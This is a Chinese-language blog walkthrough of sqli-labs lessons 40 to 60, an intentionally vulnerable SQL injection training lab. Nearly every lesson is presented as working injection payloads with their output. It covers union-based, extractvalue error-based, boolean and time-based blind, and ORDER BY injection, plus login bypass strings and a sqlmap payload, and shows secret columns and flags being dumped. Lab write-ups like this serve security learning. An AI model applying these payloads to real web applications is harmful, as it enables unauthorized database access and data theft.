<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\$ /root/TODO/sqli-lab/blind-sqli/venv/error<span class="emphasis">_based_</span>exp.py</span><br><span class="line">[+]table_name is:OTTEP9Q92I</span><br><span class="line">[+]column<span class="emphasis">_name is:secret_</span>GRH1</span><br><span class="line">[+]flag is:mcnTThCOxqzeD2ok8CJgKjfn</span><br></pre></td></tr></table></figure>

<h1 id="Less-60-Challenge-7"><a href="#Less-60-Challenge-7" class="headerlink" title="Less-60:Challenge-7"></a>Less-60:Challenge-7</h1><p>闭合符号是<code>&quot;)</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-60/index.php?id=1") and extractvalue(rand(),concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573),0x7c))%20 -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|3BYH4G78SZ|'</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-60/index.php?id=1") and extractvalue(rand(),concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573 and table_name=0x3342594834473738535a),0x7c))%20 -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|id,sessid,secret_Y1P6,tryy|'</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-60/index.php?id=1") and extractvalue(rand(),concat(0x7c,(select secret_Y1P6 from 3BYH4G78SZ),0x7c))%20 -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|uwpeCvsrLcadsa8P7wSn9Ix4|'</span><br></pre></td></tr></table></figure>

<h1 id="Less-59-Challenge-6"><a href="#Less-59-Challenge-6" class="headerlink" title="Less-59:Challenge-6"></a>Less-59:Challenge-6</h1><blockquote>
<p>Less than 5 attempts</p>
</blockquote>
<p>报错注入，整数型注入点，无须加闭合符号</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-59/index.php?id=1 and extractvalue(rand(),concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573),0x7c))%20 -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|MDAMM2TQC0|'</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-59/index.php?id=1|| extractvalue(rand(),concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573 and table_name=0x4d44414d4d3254514330),0x7c))%20 -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|id,sessid,secret_8OOF,tryy|'</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-59/index.php?id=1 ||extractvalue(rand(),concat(0x7c,(select secret_8OOF from MDAMM2TQC0),0x7c))%20 -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|CoyCW2IfA9AcJ0hkK2qLNC9v|'</span><br></pre></td></tr></table></figure>

<h1 id="Less-58-Challenge-5"><a href="#Less-58-Challenge-5" class="headerlink" title="Less-58:Challenge-5"></a>Less-58:Challenge-5</h1><p>报错注入，加单引号可闭合</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line">/Less-58/index.php?id=2' or extractvalue(rand(),concat(0x7c,(version()),0x7c) )-- -</span><br></pre></td></tr></table></figure>

<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-58/index.php?id=0' || extractvalue(rand(),concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573),0x7c))%20 -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|BOE8SLA8JQ|'</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-58/index.php?id=0' || extractvalue(rand(),concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573 and table_name=0x424f4538534c41384a51),0x7c))%20 -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|id,sessid,secret_FQB6,tryy|'</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-58/index.php?id=0' || extractvalue(rand(),concat(0x7c,(select secret_FQB6 from BOE8SLA8JQ),0x7c))%20 -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|B0vjwa55UVF1zg6dk82s5YB7|'</span><br></pre></td></tr></table></figure>

<h1 id="Less-57-Challenge-4"><a href="#Less-57-Challenge-4" class="headerlink" title="Less-57:Challenge-4"></a>Less-57:Challenge-4</h1><p>闭合符号是<code>&quot;</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-57/index.php?id=0" union select 11,22,group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573 -- -</span></span><br><span class="line"></span><br><span class="line">Your Password:ABM2UNYI3Q</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-57/index.php?id=0" union select 11,22,group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573%20 and table_name=0x41424d32554e59493351-- -</span></span><br><span class="line"></span><br><span class="line">Your Password:id,sessid,secret_6DIE,tryy</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-57/index.php?id=0" union select 11,22,group_concat(secret_6DIE) from ABM2UNYI3Q-- -</span></span><br><span class="line"></span><br><span class="line">Your Password:tZu9ubeDFgkGhooKCpNZcxwI</span><br></pre></td></tr></table></figure>

<h1 id="Less-56-Challenge-3"><a href="#Less-56-Challenge-3" class="headerlink" title="Less-56:Challenge-3"></a>Less-56:Challenge-3</h1><blockquote>
<p>14 次之内出结果</p>
</blockquote>
<p>闭合符号是<code>&#39;)</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-56/index.php?id=0') union select 11,22,group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573 -- -</span></span><br><span class="line"></span><br><span class="line">Your Password:EBO6LSIRQE</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-56/index.php?id=0') union select 11,22,group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573%20 and table_name=0x45424f364c5349525145-- -</span></span><br><span class="line"></span><br><span class="line">Your Password:id,sessid,secret_4UZO,tryy</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-56/index.php?id=0') union select 11,22,group_concat(secret_4UZO) from EBO6LSIRQE-- -</span></span><br><span class="line"></span><br><span class="line">Your Password:8amWDI2U8nxTFu6BqEDF7WlM</span><br></pre></td></tr></table></figure>

<h1 id="Less-55-Challenge-2"><a href="#Less-55-Challenge-2" class="headerlink" title="Less-55:Challenge-2"></a>Less-55:Challenge-2</h1><blockquote>
<p>要求 14 次之内出结果</p>
</blockquote>
<p>由<code>/Less-55/?id=2-1</code>知是整数型的注入点</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#</span></span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-55/index.php?id=0) union select 11,22,group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573 -- -</span></span><br><span class="line"></span><br><span class="line">Your Password:Q5X3TPYWK7</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-55/index.php?id=0) union select 11,22,group_concat(column_name) from information_schema.columns where table_name=0x59414e52364d46534453 and table_schema=0x6368616c6c656e676573 -- -</span></span><br><span class="line"></span><br><span class="line">Your Password:id,sessid,secret_IIJI,tryy</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-55/index.php?id=0) union select 11,22,secret_IIJI from Q5X3TPYWK7 -- -</span></span><br><span class="line"></span><br><span class="line">Your Password:yTWvRRHETnXIo38rWajAOFb4</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1593697751110-7b819b16-056e-4f55-ac7e-539b3631c15e.png#align=left&display=inline&height=316&margin=%5Bobject%20Object%5D&name=image.png&originHeight=632&originWidth=1485&size=493680&status=done&style=none&width=742.5" alt="image.png"></p>
<h1 id="Less-54-Challenge-1"><a href="#Less-54-Challenge-1" class="headerlink" title="Less-54:Challenge-1"></a>Less-54:Challenge-1</h1><blockquote>
<p>The objective of this challenge is to dump the <strong>(secret key)</strong> from only random table from Database <strong><em>(‘CHALLENGES’)</em></strong> in Less than 10 attempts<br>For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.</p>
</blockquote>
<p>这关的目标，是从一个叫<code>CHALLENGES</code>的数据库中找到 flag，只有 10 次请求的机会，十次之后必须重置——表名、列名都会因此发生变化（随机值）。<br>联合注入</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line">/Less-54/?id=0' union select 11,22,33 -- -</span><br></pre></td></tr></table></figure>

<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//列出数据库名</span><br><span class="line"></span><br><span class="line"><span class="section">#</span></span><br><span class="line"></span><br><span class="line">//列出表名</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-54/index.php?id=0' union select 11,22,group_concat(TABLE_name) from information_schema.tables%20 where table_schema=0x6368616c6c656e676573-- -</span></span><br><span class="line"></span><br><span class="line">Your Password:N9K0T2B5HK</span><br><span class="line"></span><br><span class="line">//列名</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-54/index.php?id=0' union select 11,22,group_concat(column_name) from information_schema.columns%20</span></span><br><span class="line"></span><br><span class="line"><span class="code">    where table_schema=0x6368616c6c656e676573</span></span><br><span class="line"></span><br><span class="line">and table_name=0x4e394b3054324235484b-- -</span><br><span class="line">Your Password:id,sessid,secret_ZRYE,tryy</span><br><span class="line"></span><br><span class="line">//flag</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-54/index.php?id=0' union select 11,22,secret_ZRYE from%20 N9K0T2B5HK-- -</span></span><br><span class="line"></span><br><span class="line">Your Password:zbEMB0vRz6OS2aawzyvIiT5l</span><br></pre></td></tr></table></figure>

<p>过关！<br>中间还复习了以下 information_schema 表的结构</p>
<p>reference</p>
<ul>
<li><a href="https://blog.csdn.net/qq_37133717/article/details/93498444" target="_blank" rel="noopener">https://blog.csdn.net/qq_37133717/article/details/93498444</a></li>
</ul>
<h1 id="Less-53-ORDER-BY-Clause-Blind-based"><a href="#Less-53-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-53 - ORDER BY Clause Blind based"></a>Less-53 - ORDER BY Clause Blind based</h1><p>闭合符号是单引号，无错误回显，那么就直接上盲注的 payload</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line">/Less-53/?sort=1',if(1=1,id,username)-- -</span><br></pre></td></tr></table></figure>

<h1 id="Less-52-ORDER-BY-Clause-Blind-based"><a href="#Less-52-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-52 - ORDER BY Clause Blind based"></a>Less-52 - ORDER BY Clause Blind based</h1><p>无需闭合，直接上盲注的 payload，<code>case when then else end</code>和<code>if</code>都可以，只是我个人比较喜欢<code>if</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-52/?sort=if(left(version(),2)='5',username ,exp(999))</span></span><br><span class="line"></span><br><span class="line">【false】 页面无结果回显</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-52/?sort=if(left(version(),1)='5',username ,exp(999))</span></span><br><span class="line"></span><br><span class="line">【true】 页面有回显</span><br></pre></td></tr></table></figure>

<p>根据页面回显的不同，就可以一位一位地跑出数据</p>
<h1 id="Less-51-ORDER-BY-Clause-Blind-based"><a href="#Less-51-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-51 - ORDER BY Clause Blind based"></a>Less-51 - ORDER BY Clause Blind based</h1><p>跟上一关类似，只是前后需要闭合：前面需要单引号闭合，后面可以用注释也可以双目符+单引号闭合（如<code>and &#39;</code>)<br>报错注入</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-51/?sort=2',extractvalue(rand(),concat(0x7c,version(),0x7c)) -- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|'</span><br></pre></td></tr></table></figure>

<p>盲注是一样的</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-51/?sort=0',if(left(version(),1)='5', username,id) -- -</span><br></pre></td></tr></table></figure>

<h1 id="Less-50-ORDER-BY-Clause-Blind-based"><a href="#Less-50-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-50 - ORDER BY Clause Blind based"></a>Less-50 - ORDER BY Clause Blind based</h1><p>无需闭合符号且有报错，可以由<code>/Less-50/?sort=2,0</code>和<code>/Less-50/?sort=2,1</code>回显不同来确定有注入点<br>通过报错注入拿到信息</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-50/?sort=2,extractvalue(rand(),concat(0x7c,version(),0x7c))</span><br></pre></td></tr></table></figure>

<p>布尔盲注</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line">/Less-50/?sort=if(1=1, username,id)</span><br><span class="line">/Less-50/?sort=if(1=2, username,id)</span><br><span class="line"></span><br><span class="line"><span class="section"># exp</span></span><br><span class="line"></span><br><span class="line">/Less-50/?sort=if(left(version(),1)='5', username,id)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h1 id="Less-49-ORDER-BY-Clause-Blind-based"><a href="#Less-49-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-49 - ORDER BY Clause Blind based"></a>Less-49 - ORDER BY Clause Blind based</h1><p>order by 要跑盲注，不但要检查是否需单引号来闭合语句，还需要记得<strong>加逗号</strong>！</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line">/Less-49/?sort=',USERNAME -- -</span><br><span class="line">/Less-49/?sort=1',IF(1=1,<span class="code">`username`</span>,0) -- -</span><br><span class="line"></span><br><span class="line"><span class="section">## 下面两种顺序不同</span></span><br><span class="line"></span><br><span class="line">/Less-49/?sort=1',IF(length(version())&gt;119,<span class="code">`username`</span>,0) -- -</span><br><span class="line">/Less-49/?sort=1',IF(length(version())&gt;9,<span class="code">`username`</span>,0) -- -</span><br><span class="line"></span><br><span class="line"><span class="section"># exp</span></span><br><span class="line"></span><br><span class="line">/Less-49/?sort=1',IF(length(version())=23,<span class="code">`username`</span>,0) -- -</span><br><span class="line">/Less-49/?sort=1',IF(left(version(),1)='5',<span class="code">`username`</span>,0) -- -</span><br><span class="line">/Less-49/?sort=1',IF(left(version(),2)='5.',<span class="code">`username`</span>,0) -- -</span><br><span class="line">...</span><br><span class="line">/Less-49/?sort=1',IF(left(version(),23)='5.7.30-0ubuntu0.18.04.1',<span class="code">`username`</span>,0) -- -</span><br></pre></td></tr></table></figure>

<h1 id="Less-48-ORDER-BY-Clause-Blind-based"><a href="#Less-48-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-48 - ORDER BY Clause Blind based"></a>Less-48 - ORDER BY Clause Blind based</h1><p>布尔盲注 poc</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-48/?sort=1,0</span></span><br><span class="line"></span><br><span class="line">无回显</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-48/?sort=1,1</span></span><br><span class="line"></span><br><span class="line">有回显</span><br></pre></td></tr></table></figure>

<p>EXP 使用<code>case when [query] then [1] else [2] end</code> 或者<code>IF([query], [1], [2])</code>均可</p>
<ul>
<li>注意<code>[1] [2]</code>位置<strong>不能填数字</strong>，带上反引号也不行。只能填字符串，如<code>test</code></li>
</ul>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># exp 跑数据</span></span><br><span class="line"></span><br><span class="line"><span class="section">## /Less-48/?sort=if(length(version())&gt;99,username,1)</span></span><br><span class="line"></span><br><span class="line">顺序为 8 9 10</span><br><span class="line"></span><br><span class="line"><span class="section">## /Less-48/?sort=if(length(version())&gt;1,username,1)</span></span><br><span class="line"></span><br><span class="line">顺序为 1-9 的增序</span><br></pre></td></tr></table></figure>

<p>利用<code>[query]</code>语句为真/假时的响应顺序不同，就能一位一位跑出数据</p>
<h1 id="Less-47-ORDER-BY-Clause-Error-Single-quote"><a href="#Less-47-ORDER-BY-Clause-Error-Single-quote" class="headerlink" title="Less-47 - ORDER BY Clause-Error-Single quote"></a>Less-47 - ORDER BY Clause-Error-Single quote</h1><p><code>order by 1</code>与<code>order by &#39;1&#39;</code>是不同的，也就是不能用单引号。但反引号```是可以的（不区分大小写）<br>加单引号报错，想必闭合符号就是单引号，用双目运算符来闭合</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-47/?sort=' and extractvalue(0x20,concat(0x7c7c,version(),0x7c7c)) ||'</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '||5.7.30-0ubuntu0.18.04.1||'</span><br></pre></td></tr></table></figure>

<h1 id="Less-46-ORDER-BY-Error-Numeric"><a href="#Less-46-ORDER-BY-Error-Numeric" class="headerlink" title="Less-46 - ORDER BY-Error-Numeric"></a>Less-46 - ORDER BY-Error-Numeric</h1><p>order by 后面的注入，特点如下</p>
<ul>
<li>无法作运算，即<code>sort=2</code>与<code>sort=(3-1)</code>不同</li>
<li>如果直接<code>if(1=2,1,SLEEP(2))</code>，sleep 时间将会变成 2*当前表中记录的数目，<strong>将会对服务器造成一定的拒绝服务攻击，</strong>建议采用子语句验证延时注入，例如<code>if(1=2,1,(select 1 from (select SLEEP(2))x))</code></li>
</ul>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 以下结果不同</span></span><br><span class="line"></span><br><span class="line"><span class="code">    rand(1=2)</span></span><br><span class="line"><span class="code">    rand(1=1)</span></span><br></pre></td></tr></table></figure>

<p>访问<code>/Less-46/?sort=1,0</code>发现蹊跷，加单引号发现回显中有错误信息<br>用<code>/Less-46/?sort=3-- -</code>确定注入点是数字型，不需要另外加闭合符号<br><strong>报错注入</strong></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-46/?sort=extractvalue(rand(),concat(0x7c,version(),0x7c))--+-</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|'</span><br></pre></td></tr></table></figure>

<p><strong>盲注</strong></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># boolean injection poc</span></span><br><span class="line"></span><br><span class="line"><span class="section"># delay injection poc</span></span><br><span class="line"></span><br><span class="line">/Less-46/?sort=select 1 from (select sleep(5))x-- -</span><br></pre></td></tr></table></figure>

<h1 id="Less-45-Stacked-Query-Blind-based-twist"><a href="#Less-45-Stacked-Query-Blind-based-twist" class="headerlink" title="Less-45 - Stacked Query Blind based twist"></a>Less-45 - Stacked Query Blind based twist</h1><p>布尔盲注，根据页面会显信息的不同来跑数据</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line"><span class="section">## login_user=admin&amp;login_password=adm') or 11=11 -- -&amp;mysubmit=Login</span></span><br><span class="line"></span><br><span class="line"><span class="code">    【true】状态码是302，跳转到主页</span></span><br><span class="line"></span><br><span class="line"><span class="section">## login_user=admin&amp;login_password=adm') or 11=00 -- -&amp;mysubmit=Login</span></span><br><span class="line"></span><br><span class="line"><span class="code">    【false】状态码是200，且含有slap1.jpg，即源码中有&lt;img src="../images/slap1.jpg"&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="Less-44-Stacked-Query-blind"><a href="#Less-44-Stacked-Query-blind" class="headerlink" title="Less-44 - Stacked Query blind"></a>Less-44 - Stacked Query blind</h1><p>页面无报错信息，只有两种状态回显，poc 如下</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># true</span></span><br><span class="line"></span><br><span class="line">// 因为是万能密码，为 true</span><br><span class="line"></span><br><span class="line"><span class="section">## login_user=admin&amp;login_password=a'+or+1=1--+-&amp;mysubmit=Login</span></span><br><span class="line"></span><br><span class="line">【true】页面 302 跳转</span><br><span class="line"></span><br><span class="line"><span class="section">## login_user=admin&amp;login_password=a'+or+1=0--+-&amp;mysubmit=Login</span></span><br><span class="line"></span><br><span class="line">【false】状态码 200</span><br></pre></td></tr></table></figure>

<h1 id="Less-43-Stacked-Query"><a href="#Less-43-Stacked-Query" class="headerlink" title="Less-43 - Stacked Query"></a>Less-43 - Stacked Query</h1><p>单引号报错，且注释符被 ban 了<br>依然采用报错注入</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password=1'+||+extractvalue(0x20,concat(0x7c,version(),0x7c))+or'</span><br></pre></td></tr></table></figure>

<h1 id="Less-42-Stacked-Query-error-based"><a href="#Less-42-Stacked-Query-error-based" class="headerlink" title="Less-42 - Stacked Query error based"></a>Less-42 - Stacked Query error based</h1><p>登录失败会提示<code>bug off hacker</code>，真是祖安程序员呢<br>报错注入</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password=1' and extractvalue(0x20,concat(0x7c,version(),0x7c)) -- -</span><br></pre></td></tr></table></figure>

<p>堆叠注入<br>略。不想构造 exp 了…<br>盲注（布尔 + 延时）</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line">login_password=2'+order+by+3--+-;</span><br><span class="line"></span><br><span class="line"><span class="section"># exp</span></span><br><span class="line"></span><br><span class="line">login_password=0'+union select 1,2,3 from (select sleep(1))x;--+-</span><br></pre></td></tr></table></figure>

<h1 id="Less-41-stacked-Query-Intiger-type-blind"><a href="#Less-41-stacked-Query-Intiger-type-blind" class="headerlink" title="Less-41 stacked Query Intiger type blind"></a>Less-41 <strong>stacked Query Intiger type blind</strong></h1><p>闭合<code>/Less-41/?id=1 -- -</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># union based</span></span><br><span class="line"></span><br><span class="line">/Less-41/?id=0 union select 1,2,3</span><br><span class="line"></span><br><span class="line"><span class="section"># blind</span></span><br><span class="line"></span><br><span class="line">/Less-41/?id=1 ^ 5</span><br><span class="line"></span><br><span class="line"><span class="section">## POC:null</span></span><br><span class="line"></span><br><span class="line">/Less-41/?id=1 and if(1=1,0,1)</span><br><span class="line"></span><br><span class="line"><span class="section">## POC:true</span></span><br><span class="line"></span><br><span class="line">/Less-41/?id=1 and if(1=1,1,1)</span><br></pre></td></tr></table></figure>

<h1 id="Less-40-stacked-Query-String-type-Blind"><a href="#Less-40-stacked-Query-String-type-Blind" class="headerlink" title="Less-40 stacked Query String type Blind"></a>Less-40 <strong>stacked Query String type Blind</strong></h1><p>用<code>/Less-40/?id=1&#39;) -- -</code>确定闭合符号为<code>&#39;)</code><br>无回显的布尔盲注<br>UNION BASED，联合注入阿又给忘了。。</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># POC</span></span><br><span class="line"></span><br><span class="line">/Less-40/?id=0') union ALL select 1,22,('33</span><br><span class="line">或者</span><br><span class="line">/Less-40/?id=0') union select 1,22,3 -- -</span><br><span class="line"></span><br><span class="line"><span class="section"># sqlmap poc</span></span><br><span class="line"></span><br><span class="line">id=-7067') UNION ALL SELECT NULL,CONCAT(0x7178627671,0x6b7375687a726b446c4746706e6b4f585273466b7655614d51667851434e7a55666e5671615a794d,0x71626a7671),NULL-- -</span><br></pre></td></tr></table></figure>

